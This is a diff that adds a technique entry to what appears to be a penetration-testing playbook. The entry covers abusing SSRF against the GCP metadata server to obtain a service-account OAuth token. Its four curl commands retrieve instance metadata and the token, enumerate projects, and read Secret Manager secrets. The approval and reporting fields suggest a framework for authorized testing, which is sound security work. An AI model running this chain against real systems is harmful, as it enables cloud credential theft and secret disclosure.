@@ -1508,6 +1508,58 @@
           "note": "A Contributor or VM-admin role lets you runCommand on a VM as root/SYSTEM."
         }
       ]
+    },
+    {
+      "id": "gcp-metadata",
+      "title": "GCP Metadata SSRF to Service-Account Token",
+      "phase": "web",
+      "hypothesis": "The GCP metadata server at 169.254.169.254 hands out an OAuth access token for the instance service account to anything that can reach it, so an SSRF on a GCP-hosted app is a token for the project. It needs the Metadata-Flavor: Google header the SSRF must smuggle, and the token reach is whatever scopes and IAM roles the service account carries. With it you enumerate the project, read Secret Manager and Cloud Storage, and look for an actAs or deploy role that runs code. It is the GCP twin of the AWS and Azure metadata paths.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "gcloud"
+      ],
+      "requires_any": [
+        "web.ssrf_confirmed",
+        "cloud.credential"
+      ],
+      "produces": [
+        "credential.candidate"
+      ],
+      "priority": 43,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a service-account OAuth token the SSRF can retrieve from the GCP metadata server",
+      "does_not_prove": "project access from the token alone; the service account IAM roles still decide its reach",
+      "report": {
+        "finding": "GCP service-account token exposed via SSRF to metadata",
+        "severity": "high"
+      },
+      "refs": [
+        "https://cloud.google.com/compute/docs/metadata/overview"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true'",
+          "note": "Instance metadata confirms a GCP VM and names the project; smuggle the Metadata-Flavor header through the SSRF."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
+          "note": "The OAuth token starts ya29.; check .../default/scopes for a broad cloud-platform scope."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://cloudresourcemanager.googleapis.com/v1/projects'",
+          "note": "Enumerate projects, buckets, secrets, and service accounts the identity can reach."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -H 'Authorization: Bearer {{bearer}}' 'https://secretmanager.googleapis.com/v1/projects/{{project}}/secrets/{{secret}}/versions/latest:access'",
+          "note": "Read Secret Manager values (base64); decode and feed into the credential loop."
+        }
+      ]
     }
   ]
 }
